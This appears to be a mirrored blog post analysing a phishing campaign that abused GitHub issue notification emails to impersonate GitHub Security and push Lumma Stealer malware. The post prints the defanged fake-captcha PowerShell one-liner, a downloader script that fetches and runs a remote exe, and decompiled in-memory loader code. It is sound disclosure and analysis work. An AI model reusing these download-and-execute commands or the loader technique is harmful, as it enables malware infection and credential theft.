<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://ianspence.com/blog/2024-09/github-email-hijack/">Original</a>
    <h1>GitHub Notification Emails Hijacked to Send Malware</h1>
    
    <div id="readability-page-1" class="page"><div>
                <p>As an open source developer I frequently get emails from GitHub, most of these emails are notifications sent on behalf of GitHub users to let me know that somebody has interacted with something and requires my attention. Perhaps somebody has created a new issue on one of my repos, or replied to a comment I left, or opened a pull request, or perhaps the user is trying to impersonate GitHub security and trick me into downloading malware.</p>
<p>If that last one sounds out of place, well, I have bad news for you - it&#39;s happened to me. Twice. In one day. Let me break down how this attack works:</p>
<ol>
<li>The attacker, using a throw-away GitHub account, creates an issue on any one of your public repos</li>
<li>The attacker quickly deletes the issue</li>
<li>You receive a notification email as the owner of the repo</li>
<li>You click the link in the email, thinking it&#39;s legitimate</li>
<li>You follow the instructions and infect your system with malware</li>
</ol>
<p>Now, as a savvy computer-haver you might think that you&#39;d never fall for such an attack, but let me show you all the clever tricks employed here, and how attackers have found a way to hijack GitHub email system to send malicious emails directly to project maintainers.</p>
<p>To start, let&#39;s look at the email message I got:</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/issue_email.png" alt="An email supposedly from the Github Security Team"/></p>
<p>In text form (link altered for your safety):</p>
<blockquote>
<p>Hey there!</p>
<p>We have detected a security vulnerability in your repository. Please contact us at [https://]github-scanner[.]com to get more information on how to fix this issue.</p>
<p>Best regards,</p>
</blockquote>
<p>Without me having already told you that this email is a notification about a new GitHub issue being created on my repo, there&#39;s virtually nothing to go on that would tell you that, because the majority of this email is controlled by the attacker.</p>
<p>Everything highlighted in red is, in one way or another, something the attacker can control - meaning the text or content is what they want it to say:</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/email_attacker_parts.png" alt="An annotated copy of the email. Most of the subject as well as the body are highlighted in red."/></p>
<p>Unfortunately the remaining parts of the email that aren&#39;t controlled by the attacker don&#39;t provide us with any sufficient amount of context to know what&#39;s <em>actually</em> going on here. Nowhere in the email does it say that this is a new issue that has been created, which gives the attacker all the power to establish whatever context they want for this message.</p>
<p>The attacker impersonates the &#34;Github Security Team&#34;, and because this email is a legitimate email sent from Github, it passes most of the common phishing checks. The email <em>is</em> from Github, and the link in the email <em>goes</em> to where it says it does.</p>
<p>GitHub can improve on these notification emails to reduce the effectiveness of this type of attack by providing more context about what action is the email for, reducing the amount of attacker-controlled content, and improving clarity about the sender of the email. I have contacted Github security (the real one, not the fake imposter one) and shared these emails with them along with my concerns.</p>
<h2 id="the-website">The Website</h2>
<p>If you were to follow through with the link on that email, you&#39;d find yourself on a page that appears to have a captcha on it. Captcha-gated sites are annoyingly common, thanks in part to services like Cloudflare which offers automated challenges based on heuristics. All this to say that users might not find a page immediately demanding they prove that they are human not that out of the ordinary.</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/website_captcha.png" alt="A screenshot of a website asking you to verify that you&#39;re a human"/></p>
<p>What is out of the ordinary is how the captcha works. Normally you&#39;d be clicking on a never-ending slideshow of sidewalks or motorcycles as you <em>definitely don&#39;t help train AI</em>, but instead this site is asking you to take the very specific step of opening the Windows Run box and pasting in a command.</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/website_clipboard.png" alt="A screenshot of a website on asking you to run some code"/></p>
<p>Honestly, if solving captchas were actually this easy, I&#39;d be down for it. Sadly, it&#39;s not real - so now let&#39;s take a look at the malware.</p>
<h2 id="the-malware">The Malware</h2>
<p>The site put the following text in my clipboard (link modified for your safety):</p>
<pre><code>powershell.exe -w hidden -Command &#34;iex (iwr &#39;[https://]2x[.]si/DR1.txt&#39;).Content&#34; # &#34;✅ &#39;&#39;I am not a robot - reCAPTCHA Verification ID: 93752&#34;
</code></pre>
<p>We&#39;ll consider this stage 1 of 4 of the attack. What this does is start a new Windows PowerShell process with the window hidden and run a command to download a script file and execute it. <code>iex</code> is a built-in alias for <code>Invoke-Expression</code>, and <code>iwr</code> is <code>Invoke-WebRequest</code>. For Linux users out there, this is equal to calling <code>curl | bash</code>. A comment is at the end of the file that, due to the Windows run box being limited in window size, effectively hides the first part of the script, so the user only sees this:</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/windows_run.png" alt="A screenshot of the Windows run box"/></p>
<p>Between the first email I got and the time of writing, the URL in the script have changed, but the contents remain the same.</p>
<p>Moving onto the second stage, the contents of the evaluated script file are (link modified for your safety):</p>
<pre data-language="powershell"><span>$webClient</span> = <span>New-Object</span> System.Net.WebClient
<span>$url1</span> = <span>&#34;[https://]github-scanner[.]com/l6E.exe&#34;</span>
<span>$filePath1</span> = <span>&#34;<span>$env:TEMP</span>\SysSetup.exe&#34;</span>
<span>$webClient</span>.DownloadFile(<span>$url1</span>, <span>$filePath1</span>)
<span>Start-Process</span> <span>-FilePath</span>  <span>$env:TEMP</span>\SysSetup.exe

</pre>
<p>This script is refreshingly straightforward, with virtually no obfuscation. It downloads a file <code>l6E.exe</code>, saves it as <code>&lt;User Home&gt;\AppData\Local\Temp\SysSetup.exe</code>, and then runs that file.</p>
<p>I first took a look at the exe itself in Windows Explorer and noticed that it had a digital signature to it.</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/codesigning.png" alt="Screenshot of the codesignature for the malicious exe"/></p>
<p>The certificate used appears to have come from Spotify, but importantly the signature of the malicious binary is not valid - meaning it&#39;s likely this is just a spoofed signature that was copied from a legitimately-signed Spotify binary.</p>
<p>I opened the exe in Ghidra and then realized that I know <em>nothing</em> about assembly or reverse engineering, but I did see mentions of .NET in the output, so I moved to dotPeek to see what I could find.</p>
<p>There&#39;s two parts of the code that matter, the entrypoint and the <code>PersonalActivation</code> method.</p>
<p>The entrypoint hides the console window, calls <code>PersonalActivation</code> twice in a background thread, then marks a region of memory as executable with <code>VirtualProtect</code> and then executes it with <code>CallWindowProcW</code>.</p>
<pre data-language="csharp"><span><span>private</span> <span>static</span> <span>void</span> <span>Main</span>(<span><span>string</span>[] args</span>)</span>
{
  Resolver resolver = <span>new</span> Resolver(<span>&#34;Consulter&#34;</span>, <span>100</span>);
  Program.FreeConsole();
  <span>double</span> num = (<span>double</span>) Program.UAdhuyichgAUIshuiAuis();
  Task.Run((Action) (() =&gt;
  {
    Program.PersonalActivation(<span>new</span> List&lt;<span>int</span>&gt;(), Program.AIOsncoiuuA, Program.Alco);
    Program.PersonalActivation(<span>new</span> List&lt;<span>int</span>&gt;(), MoveAngles.userBuffer, MoveAngles.key);
  }));
  Thread.Sleep(<span>1000</span>);
  <span>uint</span> ASxcgtjy = <span>0</span>;
  Program.VirtualProtect(<span>ref</span> Program.AIOsncoiuuA[<span>0</span>], Program.AIOsncoiuuA.Length, <span>64U</span>, <span>ref</span> ASxcgtjy);
  <span>int</span> index = <span>392</span>;
  Program.CallWindowProcW(<span>ref</span> Program.AIOsncoiuuA[index], MoveAngles.userBuffer, <span>0</span>, <span>0</span>, <span>0</span>);
}

</pre>
<p>The <code>PersonalActivation</code> function takes in a list and two byte arrays. The list parameter is not used, and the first byte array is a data buffer and the second is labeled as <code>key</code> - this, plus the amount of <em>math</em> they&#39;re doing, gives it away that is is some form of decryptor, though I&#39;m not good enough at math to figure out what algorithm it is.</p>
<p>I commented out the two calls to <code>VirtualProtect</code> and <code>CallWindowProcW</code> and compiled the rest of the code and ran it in a debugger, so that I could examine the contents of the two decrypted buffers. The first buffer contains a call to <code>CreateProcess</code></p>
<pre><code>00000000  55 05 00 00 37 13 00 00 00 00 00 00 75 73 65 72  U...7.......user
00000010  33 32 2E 64 6C 6C 00 43 72 65 61 74 65 50 72 6F  32.dll.CreatePro
00000020  63 65 73 73 41 00 56 69 72 74 75 61 6C 41 6C 6C  cessA.VirtualAll
00000030  6F 63 00 47 65 74 54 68 72 65 61 64 43 6F 6E 74  oc.GetThreadCont
00000040  65 78 74 00 52 65 61 64 50 72 6F 63 65 73 73 4D  ext.ReadProcessM
00000050  65 6D 6F 72 79 00 56 69 72 74 75 61 6C 41 6C 6C  emory.VirtualAll
00000060  6F 63 45 78 00 57 72 69 74 65 50 72 6F 63 65 73  ocEx.WriteProces
00000070  73 4D 65 6D 6F 72 79 00 53 65 74 54 68 72 65 61  sMemory.SetThrea
00000080  64 43 6F 6E 74 65 78 74 00 52 65 73 75 6D 65 54  dContext.ResumeT
00000090  68 72 65 61 64 00 39 05 00 00 BC 04 00 00 00 00  hread.9...¼.....
000000A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000000B0  00 00 00 00 00 00 43 3A 5C 57 69 6E 64 6F 77 73  ......C:\Windows
000000C0  5C 4D 69 63 72 6F 73 6F 66 74 2E 4E 45 54 5C 46  \Microsoft.NET\F
000000D0  72 61 6D 65 77 6F 72 6B 5C 76 34 2E 30 2E 33 30  ramework\v4.0.30
000000E0  33 31 39 5C 52 65 67 41 73 6D 2E 65 78 65 00 37  319\RegAsm.exe.7
[...]
</code></pre>
<p>And the second buffer, well, just take a look at the headers you might just see what&#39;s going on :)</p>
<pre><code>00000000  4D 5A 78 00 01 00 00 00 04 00 00 00 00 00 00 00  MZx.............
00000010  00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000030  00 00 00 00 00 00 00 00 00 00 00 00 78 00 00 00  ............x...
00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..´.Í!¸.LÍ!Th
00000050  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is program canno
00000060  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS 
00000070  6D 6F 64 65 2E 24 00 00 50 45 00 00 4C 01 04 00  mode.$..PE..L...
</code></pre>
<p>So now we know that the large byte arrays at the top of the code are an <em>&#34;encrypted&#34;</em> exe that this loader puts into memory, marks it as executable, and then executes it. Marvelous.</p>
<p>Sadly, this is where I hit a wall as my skills at reverse engineering applications are very limited. The final stage of the attack is a Windows exe, but not one made with .NET, and I don&#39;t really know what I&#39;m looking at in the output from Ghidra.</p>
<p>Thankfully, however, <em>actual professionals</em> have already done the work for me! Naturally, I put <em>both</em> the <a href="https://www.virustotal.com/gui/file/d737637ee5f121d11a6f3295bf0d51b06218812b5ec04fe9ea484921e905a207">first</a> and <a href="https://www.virustotal.com/gui/file/5aead2773474aa64c7e5300d49eca7ee01174fe806fd73f4a878ae4b2a4aaca1">second</a> binaries into VirusTotal and found that they were already flagged by a number of AVs. A common pattern in the naming was &#34;LUMMASTEALER&#34;, which gives us our hint as to what this malware is.</p>
<p>Lumma is one of many malware operations (read: gangs) that offer a &#34;malware as a service&#34; product. Their so-called &#34;stealer&#34; code searches through your system for cryptocurrency wallets, stored credentials, and other sensitive data. This data is then sent to their command-and-control (C2) servers where the gang can then move on to either stealing money from you, or profit from selling your data online.</p>
<p>Lumma&#39;s malware tends to not encrypt victims devices such as traditional ransomware operations do.</p>
<p>For more information I recommend this <a href="https://medium.com/@Cyfirma_/lumma-stealer-tactics-impact-and-defense-strategies-6f44a682742f">excellent write-up</a> from Cyfirma.</p>
<hr/>
<p>If you made it this far, thanks for reading! I had a lot of fun looking into the details of this attack, ranging from the weakness in Github&#39;s notification emails to the multiple layers of the attack.</p>
<p>Some of the tools I used to help me do this analysis were:</p>
<ul>
<li>Windows Sandbox</li>
<li>Ghidra</li>
<li>dotPeek</li>
<li>HxD</li>
<li>Visual Studio</li>
</ul>
<hr/>
<p>Updates:</p>
<ul>
<li>Previously I said that the codesigning certificate was stolen from Spotify, however after discussing my findings with DigiCert we agreed that this is not the case and rather that the signature is being spoofed.</li>
</ul>

            </div></div>
  </body>
</html>
